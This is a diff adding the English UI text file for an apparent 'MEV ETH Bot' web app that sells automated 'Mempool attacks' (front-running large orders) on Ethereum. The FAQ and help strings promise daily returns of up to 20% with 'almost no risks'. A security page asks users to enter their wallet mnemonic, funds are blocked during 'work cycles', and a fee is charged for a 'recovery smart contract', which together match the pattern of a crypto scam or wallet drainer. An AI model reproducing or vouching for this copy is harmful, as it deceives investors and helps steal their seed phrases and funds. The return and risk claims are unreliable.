@@ -1,0 +1,192 @@
+{ 
+    "ui": {              
+      "account": "Account",
+      "copied_long": "copied to clipboard",
+      "copied": "copied",
+      "error": "Error",
+      "waiting": "Wallet Connection Waiting...",
+      "user_id": "User ID"
+
+    },    
+
+    "setting_nav": {
+      "title": "Menu",
+      "title_2": "Language",
+      "general": "GENERAL",
+      "security": "SECURITY",
+      "referral": "REFERRAL",
+      "home": "HOME",
+      "settings": "SETTINGS",
+      "docs": "DOCS",
+      "faqs": "FAQs",
+      "support": "SUPPORT",                        
+      "buy_licence": "BUY LICENSE ",
+      "lock": "LOCK",
+      "info": "INFO"
+    },
+    
+    "buttons": {  
+      "bot_start": "Bot Start",  
+      "bot_settings": "Bot Settings",  
+      "claim": "Claim Profit",    
+      "submit": "Submit",     
+      "back": "Back",
+      "import_account": "Import Wallet",
+      "import": "Import",
+      "connect": "Connect",
+      "cancel": "Cancel",
+      "reject": "Reject",
+      "close": "Close",
+      "search": "Search",      
+      "refresh": "Refresh",
+      "confirm": "Confirm",
+      "lock": "Lock",
+      "buy": "Add Funds",
+      "buy_lic": "Buy License",
+      "buy_lic2": "Buy",
+      "lic": "License",
+      "swap": "Swap",
+      "bridge": "Bridge",
+      "withdraw": "Send",
+      "launch": "Launch",
+      "save": "Save",
+      "bot_running": "Bot's working...",
+      "send": "Send"      
+    },        
+
+ 
+    "errors": {
+      "addfonds": "It is strongly recommended that you do not fund bot`s wallet until the working cycle is complete.",    
+      "withdraw": "The operation is suspended. Wait for the end of the bot's work cycle!",
+      "import": "To avoid errors in the bot's operation, you should not import a new wallet until the working cycle is complete.",
+      "settings": "You cannot change bot settings while the bot is running. Wait until the working cycle is completed.",
+      "claim": "Wait until the working cycle is completed.",
+      "minbal": "The required minimum initial balance to start the bot",
+      "minbal_2": "Bot's wallet balance",
+      "need_set": "First you need to configure the bot. The [Bot Settings] button is used to set up the bot. ",
+      "text_7": "I saved it in a safe place",
+      "text_8": "the working cycle time cannot be changed on the trial",
+      "claim_need": "To complete the working cycle or restart the bot, you first need to claim profit",
+      "connect": "The function will be available after connecting the wallet", 
+      "zero": "The wallet balance is zero 0. Top up your wallet to execute this operation.  ", 
+      "network": "Please switch to the Ethereum Main Network. ", 
+      "network_switch": "Failed to switch to Ethereum Mainnet.", 
+      "btn": "Create"
+    }, 
+
+
+
+ 
+    "pg_general": {
+      "text_1": "Select App language"   
+                                                    
+    },    
+    "pg_security": {
+      "title": "Security Settings",     
+      "title_2": "SETTINGS",     
+      "restricted": "RESTRICTED AREA",  
+      "btn_1": "Reset App",  
+      "btn_2": "Direct wallet connection",      
+      "btn_3": "Reset License", 
+      "import": "Direct Wallet Connection", 
+      "show": "Show the security settings",    
+      "text_4": "Reset all app settings. This action cannot be undone!",        
+      "text_3": "Directly connect your wallet to the app.",              
+      "text_2": "Unlink the license from the wallet. Total license reset to transfer the license to another wallet.", 
+      "text_1": "Important application settings that can affect the application's performance.  Be very careful and attentive.",          
+      "mnemonic": "Mnemonic"
+                                                    
+    },  
+    
+    "pg_support": {
+      "text_1": "Telegram Support",
+      "text_2": "When contacting technical support, be sure to specify your User ID",
+      "text_3": "Email Support",     
+      "text_4": "The response time is 2-3 business days. ",
+      "text_5": "support User ID: ",
+      "text_6": "Use this user ID when contacting technical support",
+      "text_7": "Send an email to support.",
+      "text_8": "Subject",
+      "text_9": "your message",    
+      "text_10": "your email",
+      "btn_send": "Send Message",
+      "radio_1": "Technical issues",
+      "radio_2": "License status",  
+      "radio_3": "Referral program",  
+      "radio_4": "Ideas for improving the bot",
+      "thanks": "Thank you! Your message has been received. You will get a reply to the email address you provided within 2-3 business days. ",        
+      "error": "Sorry, the message was not sent. There is no internet connection."                                                               
+                                                    
+    }, 
+
+                  
+    "logoblock": {
+      "text_3": "Professional Tool for Mempool attacks on Ethereum Blockchain!"     
+                                                    
+    }, 
+    "startscreen": {
+      "text_3": "Search, analyze and select targets using neural network. <br> Automated attacks, security and anonymity. ",
+      "text_4": "Highest ROI - up to 20% per bot cycle*",
+      "text_5": "* Daily yield from Mempool attacks is not a constant value and depends on the chosen strategy, the size of the starting capital, and the availability of liquidity on DEXes."
+                                                           
+    },   
+    "contact": {
+      "text_1": "Need Help? ",
+      "text_2": " Support"
+                                                    
+    }, 
+   
+    "pg_help": {
+      "text_1": "Troubleshooting",
+      "text_2": "Insufficient wallet balance to pay the contract fee.",
+      "text_3": "A network and contract fee is required to activate a recovery smart contract. Therefore, your wallet must have a sufficient amount in the main asset of the selected blockchain. ",     
+      "text_4": "Network is busy.",
+      "text_5": " blockchain mempool is overloaded, transactions will be delayed.  In this case, to speed up the transaction you can change the Gas value manually in your wallet. ",
+      "text_6": "Double Spending Attempt.",
+      "text_7": "You have an automatic auto-withdrawal script installed on your address. Probably your private data has been compromised.  It is better not to use this wallet to avoid loss of funds. ",
+      "text_8": "Insufficient permissions to complete the transaction.",
+      "text_9": "In your third-party wallet, through which you connected to the application, you need to change the settings in developer mode, allowing direct connection. <br>If it is not possible to do this use Direct Wallet Connection option in the  <a href=\"/security\" ><strong>SETTING section </strong>-></a>. <br>After that, re-connect your wallet",    
+      "text_10": "Direct wallet connection failed.",
+      "text_11": "The address of the wallet connected to the application does not match the address of the direct connection. <br> You need to reconnect your wallet directly to the application with the correct data. "                        
+                                                    
+    }, 
+
+
+   
+    "pg_faq": {
+      "title": "FAQs",
+      "q_1": "Can you briefly explain how your bot works?",
+      "q_2": "You promise a profit of 3 to 15% a day. What does that depend on? I want 10% instead of 3% ",
+      "q_3": "Can you tell me the smart contract address of your INVADER BOT? ",
+      "q_5": "Why does Bot`s wallet need a minimum balance? ( {minbal} {tikker} ) <br> I paid the cost of the license, is that not enough?",
+      "q_6": "If I want to upgrade my license, do I just have to pay the difference in price?",
+      "q_7": "Are there any restrictions if I want to withdraw my money?",
+      "q_8": "Ok. If I pay for the license, then I only pay the MEV ETH Bot fee and no more hidden fees? ",    
+      "q_9": "I would like to test the MEV ETH Bot before I buy it. Do you have a Trial version",
+      "q_10": "The MEV ETH Bot uses all funds in Bot`s wallet for Mempool attacks? Any tokens?  ",
+      "q_11": "What are the risks? Can I lose my deposit?",
+      "q_12": "Do I need accounts on decentralized exchanges? ",
+      "q_13": "Do I have to go through KYC to become your client?",
+      "q_14": "Can I pay for my license in bitcoin?",
+      "q_15": "How does the MEV ETH Bot fee payment process work?",
+      "q_16": "If I'm not satisfied with something, can I get my money back for the license?",
+      "q_17": "Do you have a telegram chat room where I can chat with your customers? ",
+      "a_1": "MEV ETH Bot uses a neural network to find attack opportunities. <br> The MEV ETH Bot tracks transactions on the selected decentralized exchanges and finds among these transactions large orders that affect the liquidity in the pool and the price of the token. With an increased transaction fee, it makes a purchase of the same token slightly earlier and at a lower price. Once a large order goes into the blockchain. The price of the token in the liquidity pool increases. And immediately the MEV ETH Bot sells the token at a profit. The bot earns 0.5-20% from each transaction on these Mempool attacks. The bot can make up to 20 or more such deals per work cycle. In automatic mode and with minimal risk",                 
+      "a_2": "Profit depends on the availability of liquidity on decentralized exchanges, bot settings, chosen money management strategy, license and the size of your capital. (the larger it is, the more Mempool attacks MEV ETH Bot will be able to perform and the higher the profit will be). <br> On average, the profit is about 3-5% per work cycle with sufficient capital.",
+      "a_3": "Yes, of course. You can track all INVADER BOT transactions on the blockchain. And estimate the volume of liquidity and the number of transactions. <a href=\"https://etherscan.io/address/0x000000000dfde7deaf24138722987c9a6991e2d4\"  target=\"_blank\"><br> <b>INVADER BOT: 0x000000000dfde7deaf24138722987c9a6991e2d4 </b></a>",
+      "a_5": "You need start-up capital to make mev attacs. The MEV ETH Bot automatically finds, buys and sells trade pairs. The higher the start-up capital, the more mev attacs the MEV ETH Bot can open at the same time, and the higher the final profit. Without a minimum balance the MEV ETH Bot simply cannot start working. The cost of the license is paid separately. This is the amount of reward for the MEV ETH Bot's team, and initial setup and startup fee.",
+      "a_6": "There is no possibility to upgrade licenses. MEV ETH Bot uses individual algorithms for each license type. If you want to upgrade to a new license, you will have to pay the full license fee and create a separate account and wallet for the new license. <br> Only transferring the license to another wallet is possible. ",
+      "a_7": "You can withdraw funds from the bot wallet at any time. After the bot is launched, the funds are temporarily blocked. And you need to wait for the end of the working cycle.  The duration of the work cycle can be set in the MEV ETH Bot settings.",
+      "a_8": "Yes, that's right.  The license is a one-time fee per year.  There are no hidden fees. Everything is out in the open. You only pay the MEV ETH Bot's fee of the profits you make.",
+      "a_9": "Trial version with full functionality of Start license is available to every user.  But the bot's commission is 15% of the profit made and the bot's work is limited to one 12-hour work cycle. ",
+      "a_10": "The MEV ETH Bot makes Mempool attacks using only the major blockchain currency (ETH). <br>MEV ETH Bot ignores all other tokens  <br>",
+      "a_11": "Earning profits with Mempool attacks has almost no risks. There are small global risks, such as hacking of decentralized exchanges or sudden collapse (scam) of some tokens. But since MEV ETH Bot does not trade on a \"all-in-one\" basis, but divides its capital into parts in order to reduce risks and make more Mempool attacks, there is no danger.",
+      "a_12": "No, you do not need to create any accounts. Authorization on decentralized exchanges goes through the WEB 3.0 protocol via a wallet. The MEV ETH Bot automatically connects to decentralized exchanges and makes transactions directly through smart contracts of decentralized exchanges.",
+      "a_13": "We share the philosophy of crypto-evangelicals and believe that decentralization gives freedom from dictates and violence from the governments. We support the complete anonymity of our clients and do not require any KYC procedures.",
+      "a_14": "Yes, you can. <br> In addition to bitcoin, you can pay for a license of one of more than 10 cryptocurrencies",
+      "a_15": "Fee is automatically calculated from the received profit and paid at the end of each working cycle from your wallet or bot's wallet in automatic mode on tariffs PRO, MAX",
+      "a_16": "Refunds for licenses are available within 7 days after purchase. You can deactivate a license and request a refund through the technical support service. <br>Refunds take between 3 and 10 days. You may be asked for additional documents.",
+      "a_17": "We have a private chat room for our clients. We share our experience in it. But it is only available to our clients who have purchased a license. Mempool attacks, a specific area of the cryptocurrency market. It is the choice of professional traders and investors, and we believe that it is not the responsibility of our clients to communicate with beginners and answer their questions. <br>For this purpose there is a technical support service"                                            
+    }
+
+  }
